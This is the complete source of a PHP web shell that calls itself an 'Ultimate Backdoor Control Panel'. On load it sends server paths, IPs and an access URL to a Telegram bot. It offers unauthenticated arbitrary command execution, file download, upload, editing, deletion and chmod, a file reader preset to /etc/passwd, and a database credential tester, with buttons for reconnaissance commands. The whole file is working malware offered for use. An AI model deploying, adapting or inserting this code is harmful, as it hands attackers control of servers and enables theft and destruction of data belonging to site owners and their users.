<?php
$bot_token = "DO-DO-DO-DO-D0";
$chat_id = "DO-DO-DO-DO-D0";

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$full_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];

$info = [
    'ACCESS URL' => $current_url . '?access=admin123',
    'File Name' => basename(__FILE__),
    'Full Path' => realpath(__FILE__),
    'Server' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
    'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
    'Visitor IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'Time' => date('Y-m-d H:i:s'),
    'PHP Version' => phpversion(),
    'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'
];

$message = "BACKDOOR DEPLOYED\n\n";
foreach($info as $key => $value) {
    $message .= "$key: $value\n";
}

$telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $message
];
@file_get_contents($telegram_url . '?' . http_build_query($params));

// === ADVANCED FILE MANAGER OPERATIONS ===
if(isset($_GET['action'])) {
    $action = $_GET['action'];
    $dir = $_GET['dir'] ?? '.';
    
    if($action == 'delete' && isset($_GET['file'])) {
        $file = $_GET['file'];
        if(unlink($file)) {
            echo "File deleted: $file";
        } else {
            echo "Failed to delete: $file";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode($dir) . "'>Back</a>";
        exit;
    }
    
    if($action == 'delete_dir' && isset($_GET['dir_path'])) {
        $dir_path = $_GET['dir_path'];
        if(rmdir($dir_path)) {
            echo "Directory deleted: $dir_path";
        } else {
            echo "Failed to delete directory (must be empty): $dir_path";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode(dirname($dir_path)) . "'>Back</a>";
        exit;
    }
    
    if($action == 'rename' && isset($_GET['old']) && isset($_GET['new'])) {
        $old = $_GET['old'];
        $new = $_GET['new'];
        if(rename($old, $new)) {
            echo "Renamed: $old -> $new";
        } else {
            echo "Failed to rename";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode($dir) . "'>Back</a>";
        exit;
    }
    
    if($action == 'create_file' && isset($_GET['filename'])) {
        $filename = $_GET['filename'];
        $content = $_POST['content'] ?? '';
        if(file_put_contents($filename, $content) !== false) {
            echo "File created: $filename";
        } else {
            echo "Failed to create file";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode(dirname($filename)) . "'>Back</a>";
        exit;
    }
    
    if($action == 'create_dir' && isset($_GET['dirname'])) {
        $dirname = $_GET['dirname'];
        if(mkdir($dirname, 0755, true)) {
            echo "Directory created: $dirname";
        } else {
            echo "Failed to create directory";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode(dirname($dirname)) . "'>Back</a>";
        exit;
    }
    
    if($action == 'edit' && isset($_GET['file'])) {
        $file = $_GET['file'];
        $content = file_exists($file) ? htmlspecialchars(file_get_contents($file)) : '';
        echo "<html><head><title>Edit: $file</title></head><body>";
        echo "<h2>Edit File: $file</h2>";
        echo "<form method='POST' action='?access=admin123&action=save&file=" . urlencode($file) . "'>";
        echo "<textarea name='content' rows='30' cols='100'>$content</textarea><br>";
        echo "<input type='submit' value='Save'>";
        echo "</form>";
        echo "<br><a href='?access=admin123&dir=" . urlencode(dirname($file)) . "'>Back</a>";
        exit;
    }
    
    if($action == 'save' && isset($_GET['file'])) {
        $file = $_GET['file'];
        $content = $_POST['content'] ?? '';
        if(file_put_contents($file, $content) !== false) {
            echo "File saved: $file";
        } else {
            echo "Failed to save file";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode(dirname($file)) . "'>Back</a>";
        exit;
    }
    
    if($action == 'upload' && isset($_FILES['file'])) {
        $target_dir = $dir . '/';
        $target_file = $target_dir . basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "File uploaded: " . basename($_FILES['file']['name']);
        } else {
            echo "Upload failed";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode($dir) . "'>Back</a>";
        exit;
    }
    
    if($action == 'chmod' && isset($_GET['file']) && isset($_GET['mode'])) {
        $file = $_GET['file'];
        $mode = octdec($_GET['mode']);
        if(chmod($file, $mode)) {
            echo "Permissions changed: $file -> " . decoct($mode);
        } else {
            echo "Failed to change permissions";
        }
        echo "<br><a href='?access=admin123&dir=" . urlencode(dirname($file)) . "'>Back</a>";
        exit;
    }
}

// === COMMAND EXECUTION ===
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    }
    echo "</pre>";
    echo "<br><a href='?access=admin123'>Back to Main</a>";
    exit;
}

// === FILE DOWNLOAD ===
if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"" . basename($file) . "\"");
        header("Content-Length: " . filesize($file));
        readfile($file);
        exit;
    }
}

// === ADVANCED SHELL ===
if(isset($_GET['advshell'])) {
    echo '<html><head><title>Advanced Shell</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; }
        #shell { width: 100%; height: 500px; background: #111; color: #0f0; border: none; }
        .prompt { color: #0ff; }
        .cmd { color: #ff0; }
        .output { color: #0f0; }
    </style>
    <script>
    function executeCmd() {
        var cmd = document.getElementById("command").value;
        var output = document.getElementById("output");
        output.innerHTML += "<div class=\"prompt\">$ </div><div class=\"cmd\">" + cmd + "</div>";
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "?access=admin123&cmd=" + encodeURIComponent(cmd), true);
        xhr.onreadystatechange = function() {
            if(xhr.readyState == 4 && xhr.status == 200) {
                output.innerHTML += "<div class=\"output\">" + xhr.responseText + "</div>";
                output.scrollTop = output.scrollHeight;
            }
        };
        xhr.send();
        document.getElementById("command").value = "";
    }
    </script></head>
    <body>
    <h2>🔧 Advanced Web Shell</h2>
    <div id="output" style="height:400px; overflow-y:auto; border:1px solid #0f0; padding:10px;"></div>
    <input type="text" id="command" style="width:80%;" placeholder="Enter command..." onkeypress="if(event.keyCode==13) executeCmd()">
    <button onclick="executeCmd()">Execute</button><br><br>
    <button onclick="document.getElementById(\'command\').value=\'ls -la\'">ls -la</button>
    <button onclick="document.getElementById(\'command\').value=\'pwd\'">pwd</button>
    <button onclick="document.getElementById(\'command\').value=\'whoami\'">whoami</button>
    <button onclick="document.getElementById(\'command\').value=\'netstat -tulpn\'">netstat</button>
    <button onclick="document.getElementById(\'command\').value=\'ps aux\'">ps aux</button>
    <button onclick="document.getElementById(\'command\').value=\'find / -type f -name \"*.php\" 2>/dev/null | head -20\'">Find PHP</button>
    <br><br><a href="?access=admin123">Back to Main</a>
    </body></html>';
    exit;
}

// === WEBAPP DEMO TEST ===
if(isset($_GET['demo'])) {
    echo '<html><head><title>WebApp Demo Test</title>
    <style>
        body { background: #112; color: #fff; font-family: Arial; }
        .test-box { background: #223; border: 1px solid #445; padding: 15px; margin: 10px; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .warning { color: #ff0; }
    </style></head>
    <body>
    <h2>🛠️ WebApp Security & Configuration Test</h2>
    
    <div class="test-box">
    <h3>PHP Configuration</h3>';
    
    // Test various PHP configurations
    $tests = [
        'safe_mode' => ini_get('safe_mode'),
        'disable_functions' => ini_get('disable_functions'),
        'open_basedir' => ini_get('open_basedir'),
        'allow_url_fopen' => ini_get('allow_url_fopen'),
        'allow_url_include' => ini_get('allow_url_include'),
        'memory_limit' => ini_get('memory_limit'),
        'max_execution_time' => ini_get('max_execution_time'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
    ];
    
    foreach($tests as $key => $value) {
        echo "$key: <b>$value</b><br>";
    }
    
    echo '</div><div class="test-box">
    <h3>Server Information</h3>';
    
    // Server software detection
    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    echo "Server Software: <b>$server_software</b><br>";
    
    // Check for common web apps
    $common_apps = [
        '/wp-admin' => 'WordPress',
        '/administrator' => 'Joomla',
        '/user/login' => 'Drupal',
        '/admin' => 'Generic Admin',
        '/cgi-bin/' => 'CGI Directory',
        '/phpmyadmin' => 'phpMyAdmin',
    ];
    
    echo "<br><h4>Common Web Apps Detection:</h4>";
    foreach($common_apps as $path => $name) {
        $full_path = $_SERVER['DOCUMENT_ROOT'] . $path;
        if(file_exists($full_path) || is_dir($full_path)) {
            echo "<span class='success'>✓ $name found at: $path</span><br>";
        }
    }
    
    echo '</div><div class="test-box">
    <h3>Database Connectivity Test</h3>
    <form method="POST">
    <input type="hidden" name="test_db" value="1">
    Host: <input type="text" name="db_host" value="localhost"><br>
    Username: <input type="text" name="db_user"><br>
    Password: <input type="password" name="db_pass"><br>
    Database: <input type="text" name="db_name"><br>
    <input type="submit" value="Test Connection">
    </form>';
    
    if(isset($_POST['test_db'])) {
        $host = $_POST['db_host'];
        $user = $_POST['db_user'];
        $pass = $_POST['db_pass'];
        $name = $_POST['db_name'];
        
        $mysqli = @new mysqli($host, $user, $pass, $name);
        if($mysqli->connect_error) {
            echo "<span class='error'>✗ Connection failed: " . $mysqli->connect_error . "</span>";
        } else {
            echo "<span class='success'>✓ Connection successful!</span><br>";
            echo "Server version: " . $mysqli->server_info . "<br>";
            $mysqli->close();
        }
    }
    
    echo '</div><div class="test-box">
    <h3>Local File Inclusion Test</h3>
    <form method="GET">
    <input type="hidden" name="access" value="admin123">
    <input type="hidden" name="lfi" value="1">
    File path: <input type="text" name="file" size="50" value="/etc/passwd">
    <input type="submit" value="Read File">
    </form>';
    
    if(isset($_GET['lfi']) && isset($_GET['file'])) {
        $file = $_GET['file'];
        if(file_exists($file) && is_readable($file)) {
            echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
        } else {
            echo "<span class='error'>File not readable: $file</span>";
        }
    }
    
    echo '</div><br><a href="?access=admin123">Back to Main</a>
    </body></html>';
    exit;
}

// === ACCESS CONTROL ===
if(!isset($_GET['access']) || $_GET['access'] != 'admin123') {
    @header("Location: /");
    exit;
}

// === MAIN INTERFACE ===
$current_dir = $_GET['dir'] ?? '.';
?>
<html>
<head>
    <title>🔧 Ultimate Backdoor Control Panel</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(30, 30, 46, 0.9);
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 0 30px rgba(0, 150, 255, 0.2);
            border: 1px solid rgba(100, 150, 255, 0.3);
        }
        .header {
            text-align: center;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(100, 150, 255, 0.5);
            margin-bottom: 30px;
        }
        h1, h2, h3 {
            color: #4fc3f7;
            text-shadow: 0 0 10px rgba(79, 195, 247, 0.3);
        }
        h1 { margin: 0; font-size: 2.5em; }
        .subtitle { color: #81d4fa; font-size: 1.2em; margin-top: 5px; }
        
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .card {
            background: rgba(40, 40, 60, 0.8);
            border-radius: 8px;
            padding: 20px;
            border: 1px solid rgba(100, 150, 255, 0.2);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(0, 150, 255, 0.3);
            border-color: rgba(100, 150, 255, 0.5);
        }
        
        .nav-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 15px 0;
        }
        
        .btn {
            display: inline-block;
            padding: 10px 20px;
            background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
            color: white;
            text-decoration: none;
            border-radius: 5px;
            border: 1px solid rgba(100, 150, 255, 0.3);
            transition: all 0.3s;
            font-weight: bold;
        }
        .btn:hover {
            background: linear-gradient(135deg, #283593 0%, #3949ab 100%);
            box-shadow: 0 0 15px rgba(100, 150, 255, 0.5);
            transform: scale(1.05);
        }
        .btn-danger { background: linear-gradient(135deg, #b71c1c 0%, #d32f2f 100%); }
        .btn-danger:hover { background: linear-gradient(135deg, #d32f2f 0%, #f44336 100%); }
        .btn-success { background: linear-gradient(135deg, #1b5e20 0%, #2e7d32 100%); }
        .btn-warning { background: linear-gradient(135deg, #ff6f00 0%, #ff8f00 100%); }
        
        input, textarea, select {
            background: rgba(20, 20, 40, 0.8);
            border: 1px solid rgba(100, 150, 255, 0.3);
            color: #e0e0e0;
            padding: 8px;
            border-radius: 4px;
            margin: 5px;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #4fc3f7;
            box-shadow: 0 0 10px rgba(79, 195, 247, 0.5);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }
        th {
            background: rgba(30, 40, 80, 0.8);
            padding: 12px;
            text-align: left;
            border-bottom: 2px solid rgba(100, 150, 255, 0.3);
        }
        td {
            padding: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        tr:hover { background: rgba(50, 60, 100, 0.3); }
        
        .file-icon { margin-right: 8px; }
        .dir { color: #4fc3f7; }
        .file { color: #81c784; }
        .size { color: #ffb74d; font-size: 0.9em; }
        .perms { font-family: monospace; color: #ce93d8; }
        
        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        .status-box {
            background: rgba(30, 30, 50, 0.8);
            padding: 15px;
            border-radius: 8px;
            border-left: 5px solid #4fc3f7;
            margin: 10px 0;
        }
        
        pre {
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 Ultimate Backdoor Control Panel</h1>
            <div class="subtitle">Full System Access | Advanced File Manager | Web Shell</div>
        </div>
        
        <!-- Quick Stats -->
        <div class="dashboard">
            <div class="card">
                <h3>📊 System Info</h3>
                <div class="status-box">
                    <strong>Server:</strong> <?php echo $info['Server']; ?><br>
                    <strong>IP:</strong> <?php echo $info['Server IP']; ?><br>
                    <strong>PHP:</strong> <?php echo $info['PHP Version']; ?><br>
                    <strong>User:</strong> <?php echo @exec('whoami'); ?>
                </div>
            </div>
            
            <div class="card">
                <h3>⚡ Quick Actions</h3>
                <div class="quick-actions">
                    <a href="?access=admin123&advshell=1" class="btn">🚀 Advanced Shell</a>
                    <a href="?access=admin123&demo=1" class="btn">🛠️ WebApp Test</a>
                    <a href="?access=admin123&cmd=uname -a" class="btn">🐧 System Info</a>
                    <a href="?access=admin123&dir=/" class="btn">📁 Root Directory</a>
                </div>
            </div>
            
            <div class="card">
                <h3>🔍 Command Console</h3>
                <form method="GET">
                    <input type="hidden" name="access" value="admin123">
                    <input type="text" name="cmd" placeholder="Enter command..." style="width: 70%">
                    <input type="submit" value="Execute" class="btn">
                </form>
                <div class="nav-buttons">
                    <a href="?access=admin123&cmd=pwd">pwd</a>
                    <a href="?access=admin123&cmd=ls -la">ls -la</a>
                    <a href="?access=admin123&cmd=ps aux">ps aux</a>
                    <a href="?access=admin123&cmd=netstat -tulpn">netstat</a>
                </div>
            </div>
        </div>
        
        <!-- File Manager Section -->
        <h2>📁 Advanced File Manager</h2>
        
        <!-- Navigation & Tools -->
        <div class="nav-buttons">
            <a href="?access=admin123&dir=." class="btn">Current Dir</a>
            <a href="?access=admin123&dir=/" class="btn">Root</a>
            <a href="?access=admin123&dir=<?php echo urlencode($info['Document Root']); ?>" class="btn">Document Root</a>
            <a href="?access=admin123&dir=<?php echo urlencode(dirname($current_dir)); ?>" class="btn">⬆️ Go Up</a>
            <a href="?access=admin123" class="btn">🔄 Refresh</a>
        </div>
        
        <!-- File Operations Forms -->
        <div style="background: rgba(40,40,60,0.8); padding: 15px; border-radius: 8px; margin: 15px 0;">
            <h3>📝 File Operations</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px;">
                <!-- Create File -->
                <form method="GET" style="background: rgba(30,30,50,0.8); padding: 15px; border-radius: 5px;">
                    <input type="hidden" name="access" value="admin123">
                    <input type="hidden" name="action" value="create_file">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                    <strong>Create File:</strong><br>
                    <input type="text" name="filename" placeholder="filename.txt" style="width: 100%; margin: 5px 0;">
                    <textarea name="content" placeholder="File content..." rows="3" style="width: 100%;"></textarea>
                    <input type="submit" value="Create" class="btn-success" style="width: 100%;">
                </form>
                
                <!-- Create Directory -->
                <form method="GET" style="background: rgba(30,30,50,0.8); padding: 15px; border-radius: 5px;">
                    <input type="hidden" name="access" value="admin123">
                    <input type="hidden" name="action" value="create_dir">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                    <strong>Create Directory:</strong><br>
                    <input type="text" name="dirname" placeholder="new_directory" style="width: 100%; margin: 5px 0;">
                    <input type="submit" value="Create" class="btn-success" style="width: 100%;">
                </form>
                
                <!-- Upload File -->
                <form method="POST" enctype="multipart/form-data" style="background: rgba(30,30,50,0.8); padding: 15px; border-radius: 5px;">
                    <input type="hidden" name="access" value="admin123">
                    <input type="hidden" name="action" value="upload">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                    <strong>Upload File:</strong><br>
                    <input type="file" name="file" style="width: 100%; margin: 5px 0;">
                    <input type="submit" value="Upload" class="btn-warning" style="width: 100%;">
                </form>
                
                <!-- Rename -->
                <form method="GET" style="background: rgba(30,30,50,0.8); padding: 15px; border-radius: 5px;">
                    <input type="hidden" name="access" value="admin123">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                    <strong>Rename:</strong><br>
                    <input type="text" name="old" placeholder="oldname" style="width: 48%;">
                    <input type="text" name="new" placeholder="newname" style="width: 48%;">
                    <input type="submit" value="Rename" class="btn" style="width: 100%; margin-top: 5px;">
                </form>
            </div>
        </div>
        
        <!-- File Listing -->
        <h3>Current Directory: <?php echo htmlspecialchars($current_dir); ?></h3>
        <?php
        if(is_dir($current_dir)) {
            $files = scandir($current_dir);
            echo '<table>';
            echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>';
            
            foreach($files as $file) {
                if($file == '.') continue;
                $fullpath = $current_dir . '/' . $file;
                $is_dir = is_dir($fullpath);
                $perms = substr(sprintf('%o', fileperms($fullpath)), -4);
                $size = $is_dir ? '-' : format_size(filesize($fullpath));
                $modified = date('Y-m-d H:i:s', filemtime($fullpath));
                $icon = $is_dir ? '📁' : '📄';
                
                echo '<tr>';
                echo '<td>' . $icon . ' ';
                if($is_dir) {
                    echo '<a href="?access=admin123&dir=' . urlencode($fullpath) . '" class="dir">' . htmlspecialchars($file) . '</a>';
                } else {
                    echo '<span class="file">' . htmlspecialchars($file) . '</span>';
                }
                echo '</td>';
                echo '<td class="size">' . $size . '</td>';
                echo '<td class="perms">' . $perms . '</td>';
                echo '<td>' . $modified . '</td>';
                echo '<td>';
                
                if(!$is_dir) {
                    echo '<a href="?access=admin123&download=' . urlencode($fullpath) . '" class="btn" style="padding: 3px 8px; font-size: 0.8em;">⬇️</a> ';
                    echo '<a href="?access=admin123&action=edit&file=' . urlencode($fullpath) . '" class="btn" style="padding: 3px 8px; font-size: 0.8em;">✏️</a> ';
                    echo '<a href="?access=admin123&action=chmod&file=' . urlencode($fullpath) . '&mode=0644" class="btn" style="padding: 3px 8px; font-size: 0.8em;">644</a> ';
                    echo '<a href="?access=admin123&action=chmod&file=' . urlencode($fullpath) . '&mode=0755" class="btn" style="padding: 3px 8px; font-size: 0.8em;">755</a> ';
                    echo '<a href="?access=admin123&action=delete&file=' . urlencode($fullpath) . '&dir=' . urlencode($current_dir) . '" class="btn-danger" style="padding: 3px 8px; font-size: 0.8em;" onclick="return confirm(\'Delete this file?\')">🗑️</a> ';
                } else {
                    echo '<a href="?access=admin123&action=delete_dir&dir_path=' . urlencode($fullpath) . '" class="btn-danger" style="padding: 3px 8px; font-size: 0.8em;" onclick="return confirm(\'Delete this directory? It must be empty.\')">🗑️</a> ';
                }
                
                echo '</td>';
                echo '</tr>';
            }
            echo '</table>';
        }
        
        function format_size($bytes) {
            if($bytes >= 1073741824) {
                return number_format($bytes / 1073741824, 2) . ' GB';
            } elseif($bytes >= 1048576) {
                return number_format($bytes / 1048576, 2) . ' MB';
            } elseif($bytes >= 1024) {
                return number_format($bytes / 1024, 2) . ' KB';
            } else {
                return $bytes . ' B';
            }
        }
        ?>
        
        <!-- System Information -->
        <h2>📋 System Information</h2>
        <div class="status-box">
            <pre><?php
            foreach($info as $key => $value) {
                echo "$key: $value\n";
            }
            ?></pre>
        </div>
        
        <!-- Quick Command Buttons -->
        <h2>⚡ Quick Commands</h2>
        <div class="nav-buttons">
            <a href="?access=admin123&cmd=id" class="btn">whoami</a>
            <a href="?access=admin123&cmd=pwd" class="btn">Current Directory</a>
            <a href="?access=admin123&cmd=ls -la" class="btn">List Files</a>
            <a href="?access=admin123&cmd=uname -a" class="btn">System Info</a>
            <a href="?access=admin123&cmd=df -h" class="btn">Disk Usage</a>
            <a href="?access=admin123&cmd=free -m" class="btn">Memory Usage</a>
            <a href="?access=admin123&cmd=ps aux | head -20" class="btn">Running Processes</a>
            <a href="?access=admin123&cmd=netstat -tulpn" class="btn">Network Connections</a>
            <a href="?access=admin123&cmd=find / -type f -name '*.php' 2>/dev/null | head -20" class="btn">Find PHP Files</a>
            <a href="?access=admin123&cmd=cat /etc/passwd" class="btn">View Users</a>
        </div>
        
        <!-- Footer -->
        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1);">
            <small>Ultimate Backdoor Panel v2.0 | Active: <?php echo $info['Time']; ?> | Visitor IP: <?php echo $info['Visitor IP']; ?></small>
        </div>
    </div>
    
    <script>
    // Auto-refresh file list every 30 seconds
    setTimeout(function() {
        window.location.href = window.location.href.split('?')[0] + '?access=admin123&dir=<?php echo urlencode($current_dir); ?>';
    }, 30000);
    
    // Confirm dangerous actions
    function confirmAction(msg) {
        return confirm(msg || 'Are you sure?');
    }
    </script>
</body>
</html>
